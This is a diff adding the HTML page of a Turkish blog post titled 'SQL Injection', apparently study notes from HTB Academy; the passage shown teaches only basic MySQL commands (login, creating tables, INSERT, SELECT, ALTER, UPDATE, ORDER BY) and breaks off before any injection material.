@@ -1,0 +1,711 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL Injection | fhk0</title><meta name="author" content="fhk0"><meta name="copyright" content="fhk0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL InjectionMySQL&#x2F;MariaDB üzerinden ilerleyeceğiz., Ben giriş yapmak istiyorum ne yapmalıyım?1mysql -u root -p  Bu şekilde komut yazdıktan sonra senden bir sonraki adımda parola isteyecek. Parol">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Injection">
+<meta property="og:url" content="https://fhk0.github.io/2022/09/16/SQL-Injection/index.html">
+<meta property="og:site_name" content="fhk0">
+<meta property="og:description" content="SQL InjectionMySQL&#x2F;MariaDB üzerinden ilerleyeceğiz., Ben giriş yapmak istiyorum ne yapmalıyım?1mysql -u root -p  Bu şekilde komut yazdıktan sonra senden bir sonraki adımda parola isteyecek. Parol">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fhk0.github.io/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/sqlinjection.jpg">
+<meta property="article:published_time" content="2022-09-16T05:23:35.000Z">
+<meta property="article:modified_time" content="2022-09-16T05:52:28.172Z">
+<meta property="article:author" content="fhk0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fhk0.github.io/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/sqlinjection.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://fhk0.github.io/2022/09/16/SQL-Injection/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL Injection',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-16 08:52:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mrrobot.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/sqlinjection.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">fhk0</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL Injection</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-09-16T05:23:35.000Z" title="Created 2022-09-16 08:23:35">2022-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-09-16T05:52:28.172Z" title="Updated 2022-09-16 08:52:28">2022-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/">HTB Academy</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/Bug-Bounty-Hunter/">Bug Bounty Hunter</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL Injection"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>MySQL&#x2F;MariaDB üzerinden ilerleyeceğiz.,</p>
+<h3 id="Ben-giris-yapmak-istiyorum-ne-yapmaliyim"><a href="#Ben-giris-yapmak-istiyorum-ne-yapmaliyim" class="headerlink" title="Ben giriş yapmak istiyorum ne yapmalıyım?"></a>Ben giriş yapmak istiyorum ne yapmalıyım?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+<p>Bu şekilde komut yazdıktan sonra senden bir sonraki adımda parola isteyecek. Parolayı direkt olarak <code>-p</code> flag’inden sonra da yazabilirsin ancak bu o parolanın log kayıtlarında tutulmasına sebep olur ve bu gizlilik ve güvenlik açısından iyi bir şey değildir.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p&lt;password&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Giriş yaparken <code>-h</code> ile host belirtebiliriz ve <code>-P</code> ile de port numarası girebiliriz.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h docker.hackthebox.eu -P 3306 -p</span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Not:</strong> Varsayılan MySQL&#x2F;MariaDB port’u 3306’dır.</p>
+</div>
+
+<h3 id="Nasil-Yeni-Database-Yaratirim"><a href="#Nasil-Yeni-Database-Yaratirim" class="headerlink" title="Nasıl Yeni Database Yaratırım?"></a>Nasıl Yeni Database Yaratırım?</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> DATABASE users;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Var-Olan-Database’leri-Nasil-Gorebilirim"><a href="#Var-Olan-Database’leri-Nasil-Gorebilirim" class="headerlink" title="Var Olan Database’leri Nasıl Görebilirim?"></a>Var Olan Database’leri Nasıl Görebilirim?</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure>
+
+<p>Şu tarz bir cevap gelir:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>Gelen cevapta ben users database’ini kullanmak istiyorum diyelim. O zaman basitçe <code>USE</code> komutunu kullanabilirim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> USE users;</span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Not:</strong> SQL komutları büyük küçük harfe duyarlı değildir. Ancak database isimleri için bu geçerli değildir. Örneğin users ile USERS iki farklı database’dir.</p>
+</div>
+
+<h2 id="Tablolar"><a href="#Tablolar" class="headerlink" title="Tablolar"></a>Tablolar</h2><p>DBMS, verileri tablolar şeklinde depolar. Bir tablo yatay satırlar ve dikey sütunlardan oluşur. Bir satır ve bir sütunun kesişimine hücre denir. Her tablo, her sütunun belirli bir veri türünde olduğu sabit bir sütun kümesiyle oluşturulur.</p>
+<p>Kendi tablomuzu oluşturup inceleyelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> logins (</span><br><span class="line">    id <span class="type">INT</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    date_of_joining DATETIME</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>Dört sütunlu bir tablo oluşturmuş olduk. Tablo oluştururken dikkatimizi çeken önce değişkenin adını belirtip ardından onun türünü belirtiyor oluşumuzdur. Bu tabloyu görüntülemek için:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> TABLES;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_users <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> logins          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>İlgili tablonun yapısını görmek için <code>DESCRIBE</code> komutunu kullanabiliriz.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DESCRIBE</span> logins;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> Field           <span class="operator">|</span> Type         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> id              <span class="operator">|</span> <span class="type">int</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username        <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">100</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password        <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">100</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> date_of_joining <span class="operator">|</span> <span class="type">date</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+--------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ben-tabloya-her-eleman-ekledigimde-ID’sinin-duzenli-olarak-artmasini-istiyorum-ne-yapmaliyim"><a href="#Ben-tabloya-her-eleman-ekledigimde-ID’sinin-duzenli-olarak-artmasini-istiyorum-ne-yapmaliyim" class="headerlink" title="Ben tabloya her eleman eklediğimde ID’sinin düzenli olarak artmasını istiyorum ne yapmalıyım?"></a>Ben tabloya her eleman eklediğimde ID’sinin düzenli olarak artmasını istiyorum ne yapmalıyım?</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT</span><br></pre></td></tr></table></figure>
+
+<p><code>NOT NULL</code> kısıtı ilgili değişkenin asla boş olmamasını sağlar.</p>
+<h3 id="Ben-bir-degiskenin-essiz-olmasini-istiyorum-ne-yapmaliyim"><a href="#Ben-bir-degiskenin-essiz-olmasini-istiyorum-ne-yapmaliyim" class="headerlink" title="Ben bir değişkenin eşsiz olmasını istiyorum ne yapmalıyım?"></a>Ben bir değişkenin eşsiz olmasını istiyorum ne yapmalıyım?</h3><p>Bunun için <code>UNIQUE</code> kısıtını kullanabiliriz. Örneğin aşağıda kulanıcı adı parametresinin unique yapımı gösterilmektedir:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Ben-bir-degiskene-varsayilan-bir-deger-atamak-istiyorum-ne-yapmaliyim"><a href="#Ben-bir-degiskene-varsayilan-bir-deger-atamak-istiyorum-ne-yapmaliyim" class="headerlink" title="Ben bir değişkene varsayılan bir değer atamak istiyorum ne yapmalıyım?"></a>Ben bir değişkene varsayılan bir değer atamak istiyorum ne yapmalıyım?</h3><p><code>DEFAULT</code> kısıtı bu konuda yardımcıdır.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date_of_joining DATETIME <span class="keyword">DEFAULT</span> NOW()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PRIMARY-KEY-atamasi-yapmak-istiyorum-ne-yapmaliyim"><a href="#PRIMARY-KEY-atamasi-yapmak-istiyorum-ne-yapmaliyim" class="headerlink" title="PRIMARY KEY ataması yapmak istiyorum ne yapmalıyım?"></a>PRIMARY KEY ataması yapmak istiyorum ne yapmalıyım?</h3><p><code>PRIMARY KEY</code> kısıtı bu konuda yardımcıdır. <code>id</code> değişkenine primary key ataması yapalım:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PRIMARY</span> KEY (id)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Bu-ozellikleri-dahil-ederek-tabloyu-sifirdan-nasil-olusturabilirim"><a href="#Bu-ozellikleri-dahil-ederek-tabloyu-sifirdan-nasil-olusturabilirim" class="headerlink" title="Bu özellikleri dahil ederek tabloyu sıfırdan nasıl oluşturabilirim?"></a>Bu özellikleri dahil ederek tabloyu sıfırdan nasıl oluşturabilirim?</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> logins (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    date_of_joining DATETIME <span class="keyword">DEFAULT</span> NOW(),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL-Komutlari"><a href="#SQL-Komutlari" class="headerlink" title="SQL Komutları"></a>SQL Komutları</h1><h2 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h2><p>Tabloya yeni kayıtlar eklememizi sağlar. Şöyle bir düzeni vardır:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name <span class="keyword">VALUES</span> (column1_value, column2_value, column3_value, ...);</span><br></pre></td></tr></table></figure>
+
+<p>Bir sütuna değer girmeyip onu es geçersen o sütunun varsayılan değeri ona atanır. Örneğin aşağıda column1 değeri olan id değerini girmedik. Çünkü halihazırda o değer otomatik olarak atanmakta zaten.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name(column2, column3, ...) <span class="keyword">VALUES</span> (column2_value, column3_value, ...);</span><br></pre></td></tr></table></figure>
+
+<p>Aynı anda birden fazla kayıt eklemek için şöyle bir yol izleyebiliriz:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">INSERT</span> <span class="keyword">INTO</span> logins(username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;john&#x27;</span>, <span class="string">&#x27;john123!&#x27;</span>), (<span class="string">&#x27;tom&#x27;</span>, <span class="string">&#x27;tom123!&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Burada VALUES kısıtından sonra gelen her parantez içi bir username, password ikilisini temsil etmektedir. Yukarıda iki adet kaydı aynı anda oluşturmuş olduk.</p>
+<h2 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h2><p><code>SELECT</code> komutu tablodan veri çekmemizi sağlar. Yıldız işareti <code>(*)</code> joker karakter işlevi görür ve tüm sütunları seçer. <code>FROM</code> anahtar sözcüğü, aralarından seçim yapılacak tabloyu belirtmek için kullanılır. </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<p>Belirli sütunlarda bulunan verileri de görüntülemek mümkündür:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<h2 id="DROP"><a href="#DROP" class="headerlink" title="DROP"></a>DROP</h2><p>MySQL içerisinde tablo ve database silmek için <code>DROP</code> komutu kullanılır. Silmeden önce herhangi bir onay istemeden direkt sildiği için dikkatli kullanmak gerekir:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DROP</span> <span class="keyword">TABLE</span> logins;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ALTER"><a href="#ALTER" class="headerlink" title="ALTER"></a>ALTER</h2><p><code>ALTER</code> komutu tablo sütunları üzerinde belirli değişiklikler yapmak için kullanılır.</p>
+<p><strong>Yeni bir sütun eklemek:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> logins <span class="keyword">ADD</span> newColumn <span class="type">INT</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bir sütunu yeniden adlandırmak:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> logins RENAME <span class="keyword">COLUMN</span> newColumn <span class="keyword">TO</span> oldColumn;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sütunun veri tipini değiştirmek:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> logins MODIFY oldColumn <span class="type">DATE</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sütunu silmek:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> logins <span class="keyword">DROP</span> oldColumn;</span><br></pre></td></tr></table></figure>
+
+<h2 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h2><p>ALTER tablo özelliklerini değiştirmeye yararken, <code>UPDATE</code> komutu belirli kayıtlar üzerinde değişiklik yapmak için kullanılır. Genel syntax şöyledir:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> column1<span class="operator">=</span>newvalue1, column2<span class="operator">=</span>newvalue2, ... <span class="keyword">WHERE</span> <span class="operator">&lt;</span><span class="keyword">condition</span><span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Örnek bir kullanıma göz atalım:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">UPDATE</span> logins <span class="keyword">SET</span> password <span class="operator">=</span> <span class="string">&#x27;change_password&#x27;</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------------+-----------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username      <span class="operator">|</span> password        <span class="operator">|</span> date_of_joining     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------------+-----------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> admin         <span class="operator">|</span> p<span class="variable">@ssw0rd</span>        <span class="operator">|</span> <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> administrator <span class="operator">|</span> change_password <span class="operator">|</span> <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span> <span class="number">11</span>:<span class="number">30</span>:<span class="number">50</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> john          <span class="operator">|</span> change_password <span class="operator">|</span> <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span> <span class="number">11</span>:<span class="number">47</span>:<span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> tom           <span class="operator">|</span> change_password <span class="operator">|</span> <span class="number">2020</span><span class="number">-07</span><span class="number">-02</span> <span class="number">11</span>:<span class="number">47</span>:<span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------------+-----------------+---------------------+</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Sorgu-Sonuclari"><a href="#Sorgu-Sonuclari" class="headerlink" title="Sorgu Sonuçları"></a>Sorgu Sonuçları</h1><h2 id="Sonuclari-Siralamak"><a href="#Sonuclari-Siralamak" class="headerlink" title="Sonuçları Sıralamak"></a>Sonuçları Sıralamak</h2><p>Çıktı sonuçlarını <code>ORDER BY</code> ile sıralamak mümkündür.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> logins <span class="keyword">ORDER</span> <span class="keyword">BY</span> password;</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
